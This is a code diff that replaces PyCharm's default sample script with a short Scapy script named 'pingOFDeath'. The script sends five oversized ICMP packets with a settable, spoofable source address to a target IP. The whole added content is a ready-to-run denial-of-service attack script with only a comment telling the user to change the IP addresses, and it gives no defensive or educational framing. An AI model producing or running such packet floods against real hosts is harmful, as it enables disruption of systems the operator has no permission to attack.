@@ -1,16 +1,10 @@
-# This is a sample Python script.
+from scapy.all import *
 
-# Press ⌃R to execute it or replace it with your code.
-# Press Double ⇧ to search everywhere for classes, files, tool windows, actions, and settings.
+# Change according with your IP addresses
+SOURCE_IP="192.168.0.181"
+TARGET_IP="192.168.0.3"
+MESSAGE="T"
+NUMBER_PACKETS=5 # Number of pings
 
-
-def print_hi(name):
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press ⌘F8 to toggle the breakpoint.
-
-
-# Press the green button in the gutter to run the script.
-if __name__ == '__main__':
-    print_hi('PyCharm')
-
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
+send(NUMBER_PACKETS*pingOFDeath)
